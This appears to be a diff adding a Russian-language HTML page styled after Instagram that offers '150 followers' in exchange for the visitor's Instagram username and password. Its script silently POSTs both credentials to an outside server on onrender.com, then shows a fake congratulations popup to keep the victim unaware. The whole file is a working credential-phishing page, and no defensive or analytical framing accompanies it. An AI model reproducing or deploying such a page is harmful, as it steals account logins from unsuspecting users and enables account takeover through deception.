@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Инстаграм Подписчики</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            background-size: 300% 300%;
+            animation: gradientAnimation 6s ease infinite;
+            overflow: hidden;
+            position: relative;
+        }
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            max-width: 350px;
+            width: 90%;
+        }
+        h2 {
+            color: #dc2743;
+            font-size: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin: 15px 0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #dc2743;
+            border-radius: 25px;
+            font-size: 16px;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #ff5733;
+            box-shadow: 0 0 10px rgba(255, 87, 51, 0.5);
+        }
+        button {
+            background: linear-gradient(45deg, #ff5733, #e6683c);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: linear-gradient(45deg, #e6683c, #dc2743);
+        }
+        .icon {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            opacity: 0.4;
+            animation: moveIcons 12s linear infinite;
+        }
+        @keyframes moveIcons {
+            from { transform: translateY(100vh) rotate(0deg); }
+            to { transform: translateY(-100vh) rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>150 подписчиков</h2>
+        <form id="subscribeForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Введите ваш Instagram" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Введите ваш пароль" required>
+            </div>
+            <button type="submit">Получить</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("subscribeForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            
+            fetch("https://lvl-5e0q.onrender.com", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                let win = window.open("", "_blank", "width=400,height=300");
+                win.document.write(`
+                    <html>
+                    <head>
+                        <title>Поздравляем!</title>
+                        <style>
+                            body { 
+                                display: flex; 
+                                justify-content: center; 
+                                align-items: center; 
+                                height: 100vh; 
+                                background: #ffcc00;
+                                text-align: center;
+                                font-family: Arial, sans-serif;
+                            }
+                            .message {
+                                background: white;
+                                padding: 20px;
+                                border-radius: 10px;
+                                box-shadow: 0 0 15px rgba(0,0,0,0.3);
+                            }
+                            h1 { color: #28a745; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="message">
+                            <h1>🎉 Поздравляем! 🎉</h1>
+                            <p>Вы успешно получили 150 подписчиков!</p>
+                        </div>
+                    </body>
+                    </html>
+                `);
+            })
+            .catch(error => alert("Ошибка отправки запроса"));
+        });
+    </script>
+</body>
+</html>
